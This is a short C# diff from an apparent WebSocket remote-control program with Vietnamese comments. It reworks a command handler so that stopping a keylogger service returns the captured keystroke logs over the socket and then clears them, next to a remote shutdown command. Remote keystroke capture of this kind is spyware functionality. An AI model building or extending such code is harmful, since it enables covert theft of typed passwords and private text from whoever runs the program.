@@ -414,17 +414,11 @@ namespace WebSocketTest
 
                     case "keylog_stop":
                         KeyLoggerService.Stop();
-                        return JsonSuccess("Đã dừng ghi phím.");
-
-                    case "keylog_get":
                         string logs = KeyLoggerService.GetLogs();
-                        // Cần encode JSON cẩn thận vì log có thể chứa ký tự xuống dòng
                         string safeLogs = logs.Replace("\r", "").Replace("\n", "\\n").Replace("\"", "\\\"");
-                        return $"{{\"type\": \"keylog_data\", \"data\": \"{safeLogs}\"}}";
-                    
-                    case "keylog_clear":
                         KeyLoggerService.ClearLogs();
-                        return JsonSuccess("Đã xóa file log.");
+                        return $"{{\"type\": \"keylog_data\", \"data\": \"{safeLogs}\"}}";
+
                     // --- SHUTDOWN / RESTART COMMANDS ---
                     case "shutdown":
                         ShutdownRestart.Shutdown();
